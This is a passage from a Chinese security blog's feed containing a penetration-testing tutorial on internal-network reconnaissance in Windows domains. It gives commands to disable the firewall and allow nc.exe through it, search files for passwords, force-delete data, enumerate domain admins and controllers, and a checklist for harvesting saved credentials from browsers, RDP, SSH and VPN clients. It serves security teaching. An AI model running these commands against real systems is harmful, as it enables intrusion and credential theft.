drives</span><br><span class="line">fsutil fsinfo volumeinfo C:|findstr <span class="string">&quot;卷名&quot;</span> 查看卷名称，需要管理员权限</span><br><span class="line"><span class="number">9</span>.防火墙相关</span><br><span class="line">netsh firewall show state查看防火墙状态</span><br><span class="line">netsh firewall show config查看防火墙配置</span><br><span class="line">设置防火墙日志存储位置：</span><br><span class="line">netsh advfirewall <span class="built_in">set</span> currentprofile logging filename <span class="string">&quot;C:\Windows\temp\FirewallLOG.log&quot;</span></span><br><span class="line">关闭防火墙：</span><br><span class="line">netsh firewall get opmode disable  (WIN2003之前)</span><br><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off (WIN2003之后)</span><br><span class="line">允许某个程序的全连接：</span><br><span class="line">netsh firewall add allowdprogram C:\nc.exe <span class="string">&quot;allow nc&quot;</span> enable   (WIN2003之前)</span><br><span class="line">允许某个程序连入：</span><br><span class="line">netsh advfirewall firewall add rule name=<span class="string">&quot;pass nc&quot;</span> <span class="built_in">dir</span>=<span class="keyword">in</span> action=allow program=<span class="string">&quot;C:\nc.exe&quot;</span></span><br><span class="line">允许某个程序外连：</span><br><span class="line">netsh advfirewall firewall add rule name=<span class="string">&quot;pass nc&quot;</span> <span class="built_in">dir</span>=<span class="keyword">in</span> action=allow program=<span class="string">&quot;C:\nc.exe&quot;</span></span><br><span class="line"><span class="number">10</span>.其他</span><br><span class="line"><span class="built_in">set</span> 查看当前机器的环境变量配置,看有没有我们可以直接利用到的语言环境</span><br><span class="line">ver 查看当前机器的NT内核版本,不弹窗</span><br><span class="line">winver 查看当前机器的NT内核版本,弹窗，在非图形界面不执行这个命令</span><br><span class="line">fsutil fsinfo drives 列出当前机器上的所有盘符</span><br><span class="line">net share 查看当前机器开启的共享</span><br><span class="line">driverquery 查看当前机器安装的驱动列表</span><br><span class="line">net share public_dir=<span class="string">&quot;c:\public&quot;</span> /grant:Everyone,Full 设置共享</span><br><span class="line"><span class="built_in">dir</span> /a<span class="literal">-r</span><span class="literal">-d</span> /s /b找当前用户可读写目录,可能会很多</span><br></pre></td></tr></table></figure><h4 id="网络连接信息收集"><a href="#网络连接信息收集" class="headerlink" title="网络连接信息收集"></a>网络连接信息收集</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.查看tcp/udp网络连接状态信息</span><br><span class="line">netstat <span class="literal">-ano</span> 查看本机所有的tcp,udp端口连接及其对应的pid</span><br><span class="line">netstat <span class="literal">-anob</span> 查看本机所有的tcp,udp端口连接,pid及其对应的发起程序</span><br><span class="line">netstat <span class="literal">-ano</span> | findstr <span class="string">&quot;ESTABLISHED&quot;</span> 查看当前正处于连接状态的端口及ip</span><br><span class="line">netstat <span class="literal">-ano</span> | findstr <span class="string">&quot;LISTENING&quot;</span> 查看当前正处于监听状态的端口及ip</span><br><span class="line">netstat <span class="literal">-ano</span> | findstr <span class="string">&quot;TIME_WAIT&quot;</span> 查看当前正处于等待状态的端口及ip</span><br><span class="line"><span class="number">2</span>.查看网络配置</span><br><span class="line">ipconfig /all</span><br><span class="line"><span class="number">3</span>.查看本地DNS缓存</span><br><span class="line">ipconfig /displaydns</span><br><span class="line"><span class="number">4</span>.查看路由表</span><br><span class="line">route print</span><br><span class="line"><span class="number">5</span>.查找有价值的内网arp通信记录</span><br><span class="line">arp <span class="literal">-a</span></span><br><span class="line"><span class="number">6</span>.跟踪本机出口ip</span><br><span class="line">tracert <span class="number">8.8</span>.<span class="number">8.8</span></span><br></pre></td></tr></table></figure><h4 id="软件进程信息收集"><a href="#软件进程信息收集" class="headerlink" title="软件进程信息收集"></a>软件进程信息收集</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.查看杀毒软件</span><br><span class="line">wmic /namespace:\\root\securitycenter2 path antivirusproduct GET displayName,productState,pathToSignedProductExe</span><br><span class="line"><span class="number">2</span>.查看本机安装程序</span><br><span class="line">wmic product get name /value</span><br><span class="line">wmic product get name,version</span><br><span class="line"><span class="number">3</span>.查看当前机器的进程信息</span><br><span class="line">tasklist /svc 显示当前机器所有的进程所对应的服务 [只限于当前用户有权限看到的进程]</span><br><span class="line">tasklist /m 显示本地所有进程所调用的dll [同样只限于当前用户有权限看到的进程]</span><br><span class="line">tasklist /v 寻找进程中有无域管启用的进程，或者杀软进程</span><br><span class="line">tasklist /S <span class="number">192.168</span>.<span class="number">1.1</span> /U testlab\test /P <span class="string">&quot;test&quot;</span>查看远程主机进程列表</span><br><span class="line">taskkill /im iexplore.exe /f 用指定进程名的方式强行结束指定进程</span><br></pre></td></tr></table></figure><h4 id="历史凭证信息收集"><a href="#历史凭证信息收集" class="headerlink" title="历史凭证信息收集"></a>历史凭证信息收集</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">引用自：https://github.com/klionsec/RedTeamer</span><br><span class="line">批量抓取当前机器上的 <span class="string">&quot;各类基础服务配置文件中保存的各种账号密码&quot;</span></span><br><span class="line">   比如,各种数据库连接配置文件,各类服务自身的配置文件(redis,http basic...)...</span><br><span class="line">想办法 <span class="string">&quot;控制目标 运维管理 / 技术人员 的单机,从这些机器上去搜集可能保存着各类敏感网络资产的账号密码表&quot;</span></span><br><span class="line">   比如, *.ls,*.doc,*.docx, *.txt....</span><br><span class="line">抓取各类 <span class="string">&quot;数据库客户端工具中保存各种数据库连接账号密码</span></span><br><span class="line"><span class="string">   比如,Navicat,SSMS[MSSQL自带客户端管理工具,里面也可能保存的有密码(加密后的base64)]</span></span><br><span class="line"><span class="string">抓取当前系统 &quot;</span>注册表中保存的各类账号密码hash<span class="string">&quot; [ Windows ]</span></span><br><span class="line"><span class="string">抓取当前系统所有 &quot;</span>本地用户的明文密码/hash<span class="string">&quot; [ Windows &amp; linux ]</span></span><br><span class="line"><span class="string">抓取当前系统的所有 &quot;</span>用户token<span class="string">&quot; [ Windows ]</span></span><br><span class="line"><span class="string">抓取 &quot;</span>windows凭据管理器中保存的各类连接账号密码<span class="string">&quot;</span></span><br><span class="line"><span class="string">抓取 &quot;</span>MSTSC 客户端中保存的所有rdp连接账号密码<span class="string">&quot;</span></span><br><span class="line"><span class="string">抓取各类 &quot;</span>VNC客户端工具中保存的连接密码<span class="string">&quot;</span></span><br><span class="line"><span class="string">抓取 &quot;</span>GPP目录下保存的各类账号密码<span class="string">&quot; [ 包括组策略目录中XML里保存的密码hash 和 NETLOGON目录下的某些脚本中保存的账号密码 ]</span></span><br><span class="line"><span class="string">抓取各类 &quot;</span>SSH客户端工具中保存的各种linux系统连接账号密码<span class="string">&quot;, SecureCRT,Xshell,WinSCP,putty</span></span><br><span class="line"><span class="string">抓取各类 &quot;</span>浏览器中保存的各种web登录密码和cookie信息<span class="string">&quot;,Chrome [360浏览器],Firefox,IE,QQ浏览器</span></span><br><span class="line"><span class="string">抓取各类 &quot;</span>数据库表中保存的各类账号密码hash<span class="string">&quot;</span></span><br><span class="line"><span class="string">抓取各类 &quot;</span>FTP客户端工具中保存的各种ftp登录账号密码<span class="string">&quot;, filezila, xftp...</span></span><br><span class="line"><span class="string">抓取各类 &quot;</span>邮件客户端工具中保存的各种邮箱账号密码<span class="string">&quot;, forxmail, thunderbird...</span></span><br><span class="line"><span class="string">抓取各类 &quot;</span>SVN客户端工具中保存的所有连接账号密码及项目地址<span class="string">&quot;</span></span><br><span class="line"><span class="string">抓取各类 &quot;</span>VPN客户端工具中保存的各种vpn链接账号密码<span class="string">&quot;</span></span><br></pre></td></tr></table></figure><h4 id="用户敏感文件收集"><a href="#用户敏感文件收集" class="headerlink" title="用户敏感文件收集"></a>用户敏感文件收集</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.指定目录下搜集各类敏感文件</span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\<span class="string">&quot;*.txt&quot;</span></span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\<span class="string">&quot;*.xml&quot;</span></span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\<span class="string">&quot;*.mdb&quot;</span></span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\<span class="string">&quot;*.sql&quot;</span></span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\<span class="string">&quot;*.mdf&quot;</span></span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\<span class="string">&quot;*.eml&quot;</span></span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\<span class="string">&quot;*.pst&quot;</span></span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\<span class="string">&quot;*conf*&quot;</span></span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\<span class="string">&quot;*bak*&quot;</span></span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\<span class="string">&quot;*pwd*&quot;</span></span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\<span class="string">&quot;*pass*&quot;</span></span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\<span class="string">&quot;*login*&quot;</span></span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\<span class="string">&quot;*user*&quot;</span></span><br><span class="line"><span class="number">2</span>.指定目录下的文件中搜集各种账号密码</span><br><span class="line">findstr /<span class="built_in">si</span> pass *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br><span class="line">findstr /<span class="built_in">si</span> userpwd *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br><span class="line">findstr /<span class="built_in">si</span> <span class="built_in">pwd</span> *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br><span class="line">findstr /<span class="built_in">si</span> login *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br><span class="line">findstr /<span class="built_in">si</span> user *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br><span class="line"><span class="number">3</span>.查看,删除 指定文件</span><br><span class="line"><span class="built_in">type</span> c:\windows\temp\admin_pass.bak 查看某个文件内容</span><br><span class="line"><span class="built_in">del</span> d:\ad\*.* /a /s /q /f 强制删除指定路径下的所有文件</span><br><span class="line">tree /F /A D:\ &gt;&gt; file_list.txt 导出指定路径下的文件目录结构</span><br><span class="line"><span class="built_in">rd</span> /q/s c:\windows\temp\test 删除文件夹</span><br></pre></td></tr></table></figure><h3 id="存活主机探测"><a href="#存活主机探测" class="headerlink" title="存活主机探测"></a>存活主机探测</h3><p>基于icmp</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /L %I <span class="keyword">in</span> (<span class="number">0</span>,<span class="number">1</span>,<span class="number">254</span>) <span class="keyword">DO</span> @ping <span class="literal">-w</span> <span class="number">1</span> <span class="literal">-n</span> <span class="number">1</span> <span class="number">192.168</span>.<span class="number">7</span>.%I | findstr <span class="string">&quot;TTL=&quot;</span> &gt;&gt; pinglive.txt</span><br></pre></td></tr></table></figure><p>扫描的话建议直接在内网进行扫描，速度和准确率都比较有保障。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">常用的工具[最多<span class="number">10</span>秒一个<span class="type">c</span>段]：nbtscan[基于<span class="type">smb</span>和<span class="type">netbios</span>的内网主机发现方式]、Ladon、自开发工具</span><br><span class="line">socks代理扫描：goby</span><br></pre></td></tr></table></figure><h2 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h2><p>下文仅限于域内的信息收集，均不会涉及域内认证原理等概念，后面会对windows认证方式单独写一篇总结。</p><h3 id="net组件搜集域内信息"><a href="#net组件搜集域内信息" class="headerlink" title="net组件搜集域内信息"></a>net组件搜集域内信息</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">net user /domain查看当前域中的所有用户名，根据用户名总数大概判断域的规模</span><br><span class="line">net user xingzheng /domain 查看指定用户在当前域中的详细属性信息</span><br><span class="line">net accounts /domain查看当前域的域内账户密码设置策略</span><br><span class="line">net config workstation查看看当前的登录域</span><br><span class="line">net view 查看当前域中在线的机器，不太直观，批处理把机器名对应的ip也显示出来</span><br><span class="line">----</span><br><span class="line">host2ip.bat:先获取机器名保存为computers.txt，然后运行下面的脚本得到pic.csv</span><br><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">cls</span></span><br><span class="line"><span class="built_in">echo</span> Useage: %<span class="number">0</span> computers.txt</span><br><span class="line"><span class="keyword">for</span> /f %%a <span class="keyword">in</span> (%<span class="number">1</span>) <span class="keyword">do</span> (</span><br><span class="line">    <span class="built_in">echo</span> ping %%a <span class="literal">-4</span> <span class="literal">-n</span> <span class="number">1</span> |find /i <span class="string">&quot;ping&quot;</span> &gt;&gt; log.txt</span><br><span class="line">    ping %%a <span class="literal">-4</span> <span class="literal">-n</span> <span class="number">1</span> |find /i <span class="string">&quot;ping&quot;</span> &gt; %%a.txt</span><br><span class="line">    <span class="keyword">for</span> /f <span class="string">&quot;tokens=2 delims=[]&quot;</span> %%b <span class="keyword">in</span> (%%a.txt) <span class="keyword">do</span> (</span><br><span class="line"> @<span class="built_in">echo</span> %%a,%%b &gt;&gt; pic.csv</span><br><span class="line"> <span class="built_in">del</span> /f /q %%a.txt</span><br><span class="line">)</span><br><span class="line">)</span><br><span class="line"><span class="built_in">echo</span> <span class="keyword">end</span> &gt;&gt; end.txt</span><br><span class="line">----</span><br><span class="line">WIN10下使用Net view会出现如下报错</span><br><span class="line">System error <span class="number">1231</span></span><br><span class="line">System error <span class="number">6118</span></span><br><span class="line">解决：https://social.technet.microsoft.com/Forums/en<span class="literal">-US</span>/<span class="number">6</span>f102ed1<span class="literal">-8e76</span><span class="literal">-4cb7</span><span class="literal">-8dec</span><span class="literal">-05714466d441</span>/net<span class="literal">-view</span><span class="literal">-system</span><span class="literal">-error</span><span class="literal">-1231</span>?forum=win10itpronetworking</span><br><span class="line">----</span><br><span class="line">net view /domain查看内网种所有的域数量和名称</span><br><span class="line">net view /domain:domain_name查看指定域中在线的计算机列表</span><br><span class="line">net time /domain查看时间服务器，一般域控会做时间服务器</span><br><span class="line">net accounts /domain查看当前域的域内账户密码设置策略</span><br><span class="line">net <span class="built_in">group</span> /domain查看当前域中的所有组名</span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;domain admins&quot;</span> /domain查看当前域中的域管账户</span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;domain computers&quot;</span> /domain查看当前域中的所有的计算机名（登录过该域的计算机）</span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;domain controllers&quot;</span> /domain查看域控制器主机名</span><br><span class="line">nltest /domain_trusts查看域内信任关系</span><br></pre></td></tr></table></figure><h3 id="其他补充"><a href="#其他补充" class="headerlink" title="其他补充"></a>其他补充</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount get Caption,sid获取域内所有用户sid</span><br><span class="line">nltest /domain_trusts查看域内信任关系</span><br><span class="line">nltest /domain_trusts /all_trusts /v /server:&lt;域控ip&gt;  查询信任域</span><br><span class="line">nltest /dsgetdc:&lt;域名&gt; /server:&lt;域控ip&gt;  查询域详细信息</span><br><span class="line">dnscmd /zoneexport hack7.local dns.txt※【DC执行】导出域内DNS信息</span><br><span class="line">nslookup <span class="literal">-q</span>=mx hack7.local查看域内邮件服务器</span><br><span class="line">nslookup <span class="literal">-q</span>=ns hack7.local查看域内DNS服务器</span><br><span class="line">netdom query pdc查看域内的主域控，仅限win2008及之后的系统</span><br></pre></td></tr></table></figure><h3 id="dsquery导出域信息"><a href="#dsquery导出域信息" class="headerlink" title="dsquery导出域信息"></a>dsquery导出域信息</h3><p>利用dsquery 工具搜集域内信息，域成员机器需要自己传上去</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dsquery computer查看当前域内的所有机器,dsquery工具一般在域控上才有,不过你可以上传一个dsquery</span><br><span class="line">dsquery user查看当前域中的所有账户名</span><br><span class="line">dsquery <span class="built_in">group</span>查看当前域内的所有组名</span><br><span class="line">dsquery subnet查看到当前域所在的网段，结合nbtscan使用</span><br><span class="line">dsquery site查看域内所有的web站点</span><br><span class="line">dsquery server查看当前域中的服务器(一般结果只有域控的主机名)</span><br><span class="line">dsquery user domainroot <span class="literal">-name</span> admin* <span class="literal">-limit</span> <span class="number">240</span>  查询前<span class="number">240</span>个以admin开头的用户名</span><br></pre></td></tr></table></figure><h3 id="csvde导出域信息"><a href="#csvde导出域信息" class="headerlink" title="csvde导出域信息"></a>csvde导出域信息</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">如果你有一个当前有效的域用户账户及密码</span><br><span class="line">csvde.exe –f c:\windows\temp\e.csv –n –s <span class="number">192.168</span>.<span class="number">1.100</span>（DC的IP） –b &lt;域用户名&gt; &lt;域名&gt; &lt;域用户密码&gt;</span><br><span class="line">如果你可以使用域成员主机的system权限或者当前就在DC上</span><br><span class="line">csvde.exe –f c:\windows\temp\e.csv –n –s <span class="number">192.168</span>.<span class="number">1.100</span>（DC的IP)</span><br></pre></td></tr></table></figure><h3 id="dnsdump"><a href="#dnsdump" class="headerlink" title="dnsdump"></a>dnsdump</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnsdump.exe <span class="literal">-u</span> &lt;域名&gt;\&lt;用户名&gt; <span class="literal">-p</span> &lt;用户密码&gt;  <span class="literal">-r</span> &lt;域控主机名&gt; dump域内dns记录,导出文件名为record.scv</span><br></pre></td></tr></table></figure><h3 id="AdFind"><a href="#AdFind" class="headerlink" title="AdFind"></a>AdFind</h3><p>C++实现(未开源)，用于查询域内信息</p><p><a href="http://www.joeware.net/freetools/tools/adfind/index.htm">http://www.joeware.net/freetools/tools/adfind/index.htm</a></p><p>常用命令如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.列出域控制器名称</span><br><span class="line">AdFind <span class="literal">-sc</span> dclist</span><br><span class="line"><span class="number">2</span>.查询当前域中在线的计算机</span><br><span class="line">AdFind <span class="literal">-sc</span> computers_active</span><br><span class="line"><span class="number">3</span>.查询当前域中在线的计算机(只显示名称和操作系统)</span><br><span class="line">AdFind <span class="literal">-sc</span> computers_active name operatingSystem</span><br><span class="line"><span class="number">4</span>.查询当前域中所有计算机</span><br><span class="line">AdFind <span class="operator">-f</span> <span class="string">&quot;objectcategory=computer&quot;</span></span><br><span class="line"><span class="number">5</span>.查询当前域中所有计算机(只显示名称和操作系统)</span><br><span class="line">AdFind <span class="operator">-f</span> <span class="string">&quot;objectcategory=computer&quot;</span> name operatingSystem</span><br><span class="line"><span class="number">6</span>.查询域内所有用户</span><br><span class="line">AdFind <span class="literal">-users</span> name</span><br><span class="line"><span class="number">7</span>.查询所有GPO</span><br><span class="line">AdFind <span class="literal">-sc</span> gpodmp</span><br></pre></td></tr></table></figure><h3 id="Bloodhound-Sharphound"><a href="#Bloodhound-Sharphound" class="headerlink" title="Bloodhound/Sharphound"></a>Bloodhound/Sharphound</h3><p>BloodHound以用图与线的形式，将域内用户、计算机、组、Sessions、ACLs以及域内所有相关用户、组、计算机、登陆信息、访问控制策略之间的关系更直观的展现在Red Team面前进行更便捷的分析域内情况，更快速的在域内提升自己的权限。它也可以使Blue Team成员对己方网络系统进行更好的安全检测及保证域的安全性。<br>这里直接介绍需要在内网机器中执行的相关命令：<br>此工具的导出相对来说比较暴力，且目前此工具 exe 原版已经被识别并被各种杀软查杀，包括微软win10自带的杀软 Windows Defender 。</p><p>详细参考： <a href="https://www.anquanke.com/post/id/214046">https://www.anquanke.com/post/id/214046</a> </p><h3 id="SPN扫描"><a href="#SPN扫描" class="headerlink" title="SPN扫描"></a>SPN扫描</h3><p>不同于常规的tcp/udp端口扫描，由于spn本质就是正常的Kerberos请求，所以扫描是非常隐蔽，日前针对此类扫描的检测暂时也比较少。大部分win系统默认已自带spn探测工具即：setspn.exe，此操作无需管理权限，需域内机器执行。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn <span class="literal">-T</span> target.com <span class="literal">-Q</span> */*可完整查出当前域内所有spn</span><br></pre></td></tr></table></figure><p>详细介绍：<a href="http://hackergu.com/kerberos-sec-spn-search/">域安全-SPN扫描</a></p><h3 id="ldapsearch"><a href="#ldapsearch" class="headerlink" title="ldapsearch"></a>ldapsearch</h3><p>详细介绍：<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E7%9A%84%E8%8E%B7%E5%8F%96/">渗透基础——活动目录信息的获取</a></p><h3 id="定位域控"><a href="#定位域控" class="headerlink" title="定位域控"></a>定位域控</h3><h4 id="查询dns解析记录"><a href="#查询dns解析记录" class="headerlink" title="查询dns解析记录"></a>查询dns解析记录</h4><p>若当前主机的dns为域内dns，可通过查询dns解析记录定位域控。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\xingzheng&gt;nslookup <span class="literal">-type</span>=all _ldap._tcp.dc._msdcs.hack7.local</span><br><span class="line"></span><br><span class="line">DNS request timed out.</span><br><span class="line">    timeout was <span class="number">2</span> seconds.</span><br><span class="line">服务器:  UnKnown</span><br><span class="line">Address:  <span class="number">192.168</span>.<span class="number">86.109</span></span><br><span class="line"></span><br><span class="line">_ldap._tcp.dc._msdcs.hack7.local        SRV service location:</span><br><span class="line">          priority       = <span class="number">0</span></span><br><span class="line">          weight         = <span class="number">100</span></span><br><span class="line">          port           = <span class="number">389</span></span><br><span class="line">          svr hostname   = dc.hack7.local</span><br><span class="line">dc.hack7.local  internet address = <span class="number">192.168</span>.<span class="number">86.109</span></span><br></pre></td></tr></table></figure><h4 id="SPN扫描-1"><a href="#SPN扫描-1" class="headerlink" title="SPN扫描"></a>SPN扫描</h4><p>在SPN扫描结果中可以通过如下内容，来进行域控的定位。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CN=DC,OU=Domain Controllers,DC=hack7,DC=loca</span><br></pre></td></tr></table></figure><h4 id="net-group"><a href="#net-group" class="headerlink" title="net group"></a>net group</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\xingzheng&gt;net <span class="built_in">group</span> <span class="string">&quot;domain controllers&quot;</span> /domain</span><br><span class="line">这项请求将在域 hack7.local 的域控制器处理。</span><br><span class="line"></span><br><span class="line">组名     Domain Controllers</span><br><span class="line">注释     域中所有域控制器</span><br><span class="line"></span><br><span class="line">成员</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">DC<span class="variable">$</span></span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure><h4 id="端口识别"><a href="#端口识别" class="headerlink" title="端口识别"></a>端口识别</h4><p>扫描内网中同时开放389和53端口的机器。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">端口：<span class="number">389</span></span><br><span class="line">服务：LDAP、ILS</span><br><span class="line">说明：轻型目录访问协议和NetMeeting Internet Locator Server共用这一端口。</span><br><span class="line">端口：<span class="number">53</span></span><br><span class="line">服务：Domain Name Server（DNS）</span><br><span class="line">说明：<span class="number">53</span>端口为DNS(Domain Name Server，域名服务器)服务器所开放，主要用于域名解析，DNS服务在NT系统中使用的最为广泛。通过DNS服务器可以实现域名与IP地址之间的转换，只要记住域名就可以快速访问网站。</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;无论是通过外网打点，还是水坑钓鱼，进入内网后的第一步，也是最重要的一步就是信息收集，而且信息收集往往是一直穿插在整个内网渗透过程中。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="内网渗透" scheme="https://www.se7ensec.cn/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>一星期实战总结（三）</title>
    <link href="https://www.se7ensec.cn/2020/04/25/%E4%B8%80%E6%98%9F%E6%9C%9F%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%933/"/>
    <id>https://www.se7ensec.cn/2020/04/25/%E4%B8%80%E6%98%9F%E6%9C%9F%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%933/</id>
    <published>2020-04-25T02:30:24.000Z</published>
    <updated>2020-11-18T14:11:57.805Z</updated>
    
